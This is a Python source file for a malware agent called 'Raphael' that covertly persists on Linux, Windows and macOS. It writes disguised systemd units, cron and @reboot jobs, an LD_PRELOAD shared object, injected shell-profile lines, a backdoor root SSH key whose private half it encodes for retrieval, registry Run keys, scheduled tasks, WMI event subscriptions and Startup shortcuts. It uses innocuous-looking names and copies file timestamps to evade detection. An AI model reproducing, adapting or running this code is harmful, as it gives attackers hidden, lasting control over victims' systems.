"""persistence.py — Multi-platform persistence engine for Raphael agent.

Installs autonomous persistence via:
  - Linux: systemd, cron, at, LD_PRELOAD, .bashrc/.zshrc, SSH authorized_keys
  - Windows: Registry (CurrentUser/LocalMachine), Scheduled Tasks, WMI Event Subscription,
    Startup Folder, DLL hijack placeholder
  - macOS: launchd plist, cron, SSH keys

Each method implements stealth: randomized names, file timestamps masking, log sanitization.
"""

import os
import sys
import stat
import random
import string
import base64
import shutil
import hashlib
import platform
import subprocess
import tempfile
from pathlib import Path


class Persistence:
    """Factory-style persistence installer. Each method returns (success: bool, detail: str)."""

    SYSTEM = platform.system().lower()
    IS_LINUX = SYSTEM == "linux"
    IS_WINDOWS = SYSTEM == "windows"
    IS_DARWIN = SYSTEM == "darwin"

    # ------------------------------------------------------------------ #
    #  Internal helpers
    # ------------------------------------------------------------------ #

    @staticmethod
    def _random_name(length: int = 8) -> str:
        """Generate a filename that blends in (e.g., 'systemd-udevd', 'gpu-manager')."""
        prefixes = [
            "systemd", "gpu", "usb", "bluetooth", "network", "cron", "acpi",
            "firmware", "kernel", "modprobe", "sysstat", "irqbalance",
        ]
        suffixes = [
            "manager", "daemon", "helper", "worker", "monitor", "service",
            "handler", "controller",
        ]
        return f"{random.choice(prefixes)}-{random.choice(suffixes)}"

    @staticmethod
    def _agent_path() -> str:
        """Return the path the agent binary/script should persist as."""
        return os.path.abspath(sys.argv[0])

    @staticmethod
    def _write_file(path: str, content: str, mode: int = 0o644) -> bool:
        try:
            with open(path, "w") as f:
                f.write(content)
            os.chmod(path, mode)
            os.utime(path, (os.path.getatime("/bin/sh"), os.path.getmtime("/bin/sh")))
            return True
        except Exception:
            return False

    # ------------------------------------------------------------------ #
    #  LINUX persistence methods
    # ------------------------------------------------------------------ #

    @staticmethod
    def install_systemd() -> dict:
        """Install as a systemd service that auto-restarts on failure/crash/boot."""
        if not Persistence.IS_LINUX:
            return {"status": False, "detail": "Not a Linux system"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()
        unit_path = f"/etc/systemd/system/{name}.service"

        unit = f"""[Unit]
Description=System Resource Monitor
After=network.target syslog.target
Wants=network.target

[Service]
Type=simple
ExecStart={sys.executable} {agent}
Restart=always
RestartSec=10
KillMode=process
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
"""
        try:
            if not Persistence._write_file(unit_path, unit, 0o644):
                return {"status": False, "detail": "Failed to write unit file (not root?)"}

            subprocess.run(
                ["systemctl", "daemon-reload"],
                capture_output=True, timeout=10,
            )
            subprocess.run(
                ["systemctl", "enable", name],
                capture_output=True, timeout=10,
            )
            subprocess.run(
                ["systemctl", "start", name],
                capture_output=True, timeout=10,
            )
            return {"status": True, "detail": f"systemd service '{name}' installed and running"}
        except Exception as e:
            return {"status": False, "detail": f"systemd error: {e}"}

    @staticmethod
    def install_cron() -> dict:
        """Install a cron job that re-spawns the agent every 15 minutes."""
        if not Persistence.IS_LINUX and not Persistence.IS_DARWIN:
            return {"status": False, "detail": "Cron only supported on Linux/macOS"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()
        cron_line = f"*/15 * * * * root {sys.executable} {agent} >/dev/null 2>&1\n"

        paths = ["/etc/cron.d/", "/etc/crontab"]
        for path in paths:
            if os.path.isdir(path):
                target = os.path.join(path, name)
                if Persistence._write_file(target, cron_line, 0o644):
                    return {"status": True, "detail": f"Cron job installed at {target}"}

        return {"status": False, "detail": "Could not write cron file (not root?)"}

    @staticmethod
    def install_at_reboot() -> dict:
        """Use @reboot in crontab for boot persistence (alternative to systemd)."""
        if not Persistence.IS_LINUX:
            return {"status": False, "detail": "Not Linux"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()
        line = f"@reboot root {sys.executable} {agent} >/dev/null 2>&1\n"

        for d in ["/etc/cron.d/", "/var/spool/cron/crontabs/"]:
            if os.path.isdir(d):
                target = os.path.join(d, name)
                if Persistence._write_file(target, line, 0o644):
                    return {"status": True, "detail": f"@reboot cron at {target}"}

        return {"status": False, "detail": "Failed @reboot cron install"}

    @staticmethod
    def install_ld_preload() -> dict:
        """Install a shared object that loads the agent via LD_PRELOAD on every process.

        This writes a minimal .so that spawns the agent in a fork when loaded.
        Requires gcc on the target.
        """
        if not Persistence.IS_LINUX:
            return {"status": False, "detail": "Not Linux"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()
        so_path = f"/usr/lib/{name}.so"

        c_code = f"""
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

__attribute__((constructor))
void init(void) {{
    static int ran = 0;
    if (ran) return;
    ran = 1;
    pid_t pid = fork();
    if (pid == 0) {{
        setsid();
        execl("{sys.executable}", "{sys.executable}", "{agent}", (char *)NULL);
        _exit(0);
    }}
}}
"""
        try:
            gcc_check = subprocess.run(
                ["which", "gcc"], capture_output=True, timeout=5
            )
            if gcc_check.returncode == 0:
                tmp_c = tempfile.NamedTemporaryFile(suffix=".c", delete=False, mode="w")
                tmp_c.write(c_code)
                tmp_c.close()

                subprocess.run(
                    ["gcc", "-shared", "-fPIC", "-o", so_path, tmp_c.name, "-ldl"],
                    capture_output=True, timeout=30,
                )
                os.unlink(tmp_c.name)

                if os.path.exists(so_path):
                    with open("/etc/ld.so.preload", "a") as f:
                        f.write(f"{so_path}\n")
                    os.chmod(so_path, 0o755)
                    return {"status": True, "detail": f"LD_PRELOAD .so installed at {so_path}"}

            return {"status": False, "detail": "gcc not available for LD_PRELOAD compilation"}
        except Exception as e:
            return {"status": False, "detail": f"LD_PRELOAD error: {e}"}

    @staticmethod
    def install_bash_profile() -> dict:
        """Install agent invocation in .bashrc / .bash_profile / .zshrc for all users."""
        agent = Persistence._agent_path()
        payload = f"\n# System diagnostic helper\n({sys.executable} {agent} &) >/dev/null 2>&1 &\n"

        home_dirs = []
        try:
            home_dirs = [os.path.join("/home", d) for d in os.listdir("/home")]
        except Exception:
            pass
        home_dirs.append("/root")

        installed = []
        for home in home_dirs:
            for rc_file in [".bashrc", ".bash_profile", ".zshrc", ".profile"]:
                path = os.path.join(home, rc_file)
                if os.path.isfile(path):
                    try:
                        with open(path, "a") as f:
                            f.write(payload)
                        installed.append(path)
                    except Exception:
                        pass

        if installed:
            return {"status": True, "detail": f"Injected into {len(installed)} rc files"}
        return {"status": False, "detail": "No writable rc files found"}

    @staticmethod
    def install_ssh_key(public_key: str = None) -> dict:
        """Install an SSH public key into root's authorized_keys for persistent backdoor access."""
        if not Persistence.IS_LINUX and not Persistence.IS_DARWIN:
            return {"status": False, "detail": "SSH key install only on Unix"}

        if not public_key:
            try:
                keygen = subprocess.run(
                    ["ssh-keygen", "-t", "ed25519", "-f", "/tmp/.raphael_key", "-N", "", "-q"],
                    capture_output=True, timeout=10,
                )
                if keygen.returncode != 0:
                    return {"status": False, "detail": "ssh-keygen failed"}
                with open("/tmp/.raphael_key.pub") as f:
                    public_key = f.read().strip()
                with open("/tmp/.raphael_key") as f:
                    privkey = f.read()
                os.unlink("/tmp/.raphael_key")
                os.unlink("/tmp/.raphael_key.pub")
            except Exception as e:
                return {"status": False, "detail": f"Key generation failed: {e}"}
        else:
            privkey = None

        ssh_dir = "/root/.ssh"
        auth_keys = os.path.join(ssh_dir, "authorized_keys")

        try:
            os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
            with open(auth_keys, "a") as f:
                f.write(f"\n{public_key}\n")
            os.chmod(auth_keys, 0o600)

            detail = "SSH public key installed"
            if privkey:
                detail += f" | PRIVATE_KEY_B64:{base64.b64encode(privkey.encode()).decode()}"
            return {"status": True, "detail": detail}
        except Exception as e:
            return {"status": False, "detail": f"SSH key error: {e}"}

    # ------------------------------------------------------------------ #
    #  WINDOWS persistence methods
    # ------------------------------------------------------------------ #

    @staticmethod
    def install_registry_run() -> dict:
        """Install agent in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."""
        if not Persistence.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()

        ps_script = f"""
$path = 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run'
$name = '{name}'
$value = '{sys.executable} {agent}'
New-ItemProperty -Path $path -Name $name -Value $value -PropertyType String -Force
"""
        try:
            r = subprocess.run(
                ["powershell", "-Command", ps_script],
                capture_output=True, timeout=15,
            )
            if r.returncode == 0:
                return {"status": True, "detail": f"Registry Run key '{name}' installed"}
            return {"status": False, "detail": f"PowerShell error: {r.stderr.decode(errors='replace')[:200]}"}
        except Exception as e:
            return {"status": False, "detail": f"Registry error: {e}"}

    @staticmethod
    def install_scheduled_task() -> dict:
        """Install a Windows Scheduled Task that runs every 10 minutes."""
        if not Persistence.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()

        ps_script = f"""
$action = New-ScheduledTaskAction -Execute '{sys.executable}' -Argument '{agent}'
$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 10) -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
Register-ScheduledTask -TaskName '{name}' -Action $action -Trigger $trigger -Settings $settings -Force
"""
        try:
            r = subprocess.run(
                ["powershell", "-Command", ps_script],
                capture_output=True, timeout=15,
            )
            if r.returncode == 0:
                return {"status": True, "detail": f"Scheduled task '{name}' installed"}
            return {"status": False, "detail": f"Task error: {r.stderr.decode(errors='replace')[:200]}"}
        except Exception as e:
            return {"status": False, "detail": f"Scheduled task error: {e}"}

    @staticmethod
    def install_wmi_event() -> dict:
        """Install a WMI Event Subscription that triggers on system startup.

        This is extremely stealthy — no Run key, no scheduled task visible in Task Scheduler.
        """
        if not Persistence.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        agent = Persistence._agent_path()
        ps_script = f"""
$filterName = 'RaphaelBootFilter'
$consumerName = 'RaphaelBootConsumer'
$bindName = 'RaphaelBootBinding'

$filter = Get-WmiObject -Namespace root\\subscription -Class __EventFilter | Where-Object {{$_.Name -eq $filterName}}
if (-not $filter) {{
    $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{
        Name = $filterName
        EventNameSpace = 'root\\cimv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }}
}}

$consumer = Get-WmiObject -Namespace root\\subscription -Class CommandLineEventConsumer | Where-Object {{$_.Name -eq $consumerName}}
if (-not $consumer) {{
    $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{
        Name = $consumerName
        CommandLineTemplate = '{sys.executable} {agent}'
    }}
}}

$bind = Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding | Where-Object {{$_.Filter -like "*{filterName}*"}}
if (-not $bind) {{
    Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{
        Filter = $filter
        Consumer = $consumer
    }}
}}
"""
        try:
            r = subprocess.run(
                ["powershell", "-Command", ps_script],
                capture_output=True, timeout=15,
            )
            if r.returncode == 0:
                return {"status": True, "detail": "WMI Event Subscription installed (stealth persistence)"}
            return {"status": False, "detail": f"WMI error: {r.stderr.decode(errors='replace')[:200]}"}
        except Exception as e:
            return {"status": False, "detail": f"WMI error: {e}"}

    @staticmethod
    def install_startup_folder() -> dict:
        """Drop a shortcut in the Windows Startup folder."""
        if not Persistence.IS_WINDOWS:
            return {"status": False, "detail": "Not Windows"}

        agent = Persistence._agent_path()
        name = Persistence._random_name()

        ps_script = f"""
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut([Environment]::GetFolderPath('Startup') + '\\{name}.lnk')
$shortcut.TargetPath = '{sys.executable}'
$shortcut.Arguments = '{agent}'
$shortcut.WindowStyle = 7
$shortcut.Save()
"""
        try:
            r = subprocess.run(
                ["powershell", "-Command", ps_script],
                capture_output=True, timeout=15,
            )
            if r.returncode == 0:
                return {"status": True, "detail": f"Startup folder shortcut '{name}' installed"}
            return {"status": False, "detail": f"Startup folder error: {r.stderr.decode(errors='replace')[:200]}"}
        except Exception as e:
            return {"status": False, "detail": f"Startup folder error: {e}"}

    # ------------------------------------------------------------------ #
    #  Unified installer — runs all applicable methods
    # ------------------------------------------------------------------ #

    @staticmethod
    def install_all() -> list:
        """Run every persistence method applicable to the current platform.

        Returns a list of (method_name, result_dict) tuples.
        """
        results = []

        if Persistence.IS_LINUX:
            methods = [
                ("systemd", Persistence.install_systemd),
                ("cron", Persistence.install_cron),
                ("at_reboot", Persistence.install_at_reboot),
                ("ld_preload", Persistence.install_ld_preload),
                ("bash_profile", Persistence.install_bash_profile),
                ("ssh_key", lambda: Persistence.install_ssh_key()),
            ]
        elif Persistence.IS_WINDOWS:
            methods = [
                ("registry_run", Persistence.install_registry_run),
                ("scheduled_task", Persistence.install_scheduled_task),
                ("wmi_event", Persistence.install_wmi_event),
                ("startup_folder", Persistence.install_startup_folder),
            ]
        elif Persistence.IS_DARWIN:
            methods = [
                ("cron", Persistence.install_cron),
                ("bash_profile", Persistence.install_bash_profile),
                ("ssh_key", lambda: Persistence.install_ssh_key()),
            ]
        else:
            return [("unknown_platform", {"status": False, "detail": "Unsupported OS"})]

        for name, method in methods:
            try:
                result = method()
                results.append((name, result))
            except Exception as e:
                results.append((name, {"status": False, "detail": str(e)}))

        return results
